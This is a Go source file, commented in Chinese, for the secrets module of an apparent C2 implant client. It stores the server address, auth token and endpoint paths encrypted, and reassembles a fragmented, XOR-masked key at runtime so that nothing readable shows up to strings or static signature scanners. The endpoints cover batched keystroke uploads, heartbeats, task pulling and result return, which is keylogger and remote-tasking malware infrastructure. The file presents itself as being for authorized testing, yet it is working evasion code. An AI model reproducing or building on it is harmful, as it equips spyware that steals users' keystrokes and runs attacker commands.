// Package c2secret 存放客户端内置的 C2 敏感配置(服务端地址、鉴权令牌、
// 接口路径),以 AES-256-GCM 密文形式内嵌于二进制:密钥拆分为多段碎片,
// 运行时组装后与掩码异或还原,避免明文与完整密钥以连续字节出现在二进制中,
// 规避 strings/静态特征匹配。secretdata.go 由 tools/secretgen 生成,
// 修改明文后需重新生成并重编译两端。
// 仅用于经授权的测试环境。
package c2secret

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"sync"
)

const gcmNonceSize = 12

// assembleKey 运行时组装密钥材料:拼接四段碎片后与掩码异或。
// 碎片与掩码均为生成器产出的密态数据,明文密钥全程不出现在内存以外的存储中。
//
//go:noinline
func assembleKey() []byte {
	k := make([]byte, 0, len(keyA)+len(keyB)+len(keyC)+len(keyD))
	k = append(k, keyA...)
	k = append(k, keyB...)
	k = append(k, keyC...)
	k = append(k, keyD...)
	mask := make([]byte, len(k))
	n := copy(mask, maskP)
	copy(mask[n:], maskQ)
	for i := range k {
		k[i] ^= mask[i]
	}
	return k
}

// aesKey 由组装的密钥材料派生 AES-256 密钥。
//
//go:noinline
func aesKey() []byte {
	sum := sha256.Sum256(assembleKey())
	return sum[:]
}

// openSecret 解密一条内嵌密文(格式: 12 字节 nonce + 密文 + GCM tag)。
// 失败返回空串与 false,调用方静默降级,不暴露细节。
//
//go:noinline
func openSecret(blob []byte) (string, bool) {
	if len(blob) < gcmNonceSize+gcmTagSize {
		return "", false
	}
	block, err := aes.NewCipher(aesKey())
	if err != nil {
		return "", false
	}
	g, err := cipher.NewGCM(block)
	if err != nil {
		return "", false
	}
	pt, err := g.Open(nil, blob[:gcmNonceSize], blob[gcmNonceSize:], nil)
	if err != nil {
		return "", false
	}
	return string(pt), true
}

const gcmTagSize = 16

// cachedSecret 返回一个按需解密并缓存的访问器:
// 首次调用时解密内嵌密文并缓存明文,后续调用直接返回缓存。
func cachedSecret(blob []byte) func() string {
	var once sync.Once
	var val string
	return func() string {
		once.Do(func() { val, _ = openSecret(blob) })
		return val
	}
}

var (
	// ServerURL 内置的 C2 服务端地址
	ServerURL = cachedSecret(blobServerURL)
	// Token 接口鉴权令牌
	Token = cachedSecret(blobToken)
	// HeaderName 上报请求携带鉴权值的 Header 名称
	HeaderName = cachedSecret(blobHeader)
	// ReportPath 按键批次上报接口路径
	ReportPath = cachedSecret(blobReport)
	// HealthPath 心跳/测活接口路径
	HealthPath = cachedSecret(blobHealth)
	// TasksPath 客户端拉取待执行任务接口路径
	TasksPath = cachedSecret(blobTasks)
	// ResultPath 客户端回传任务执行结果接口路径
	ResultPath = cachedSecret(blobResult)
)
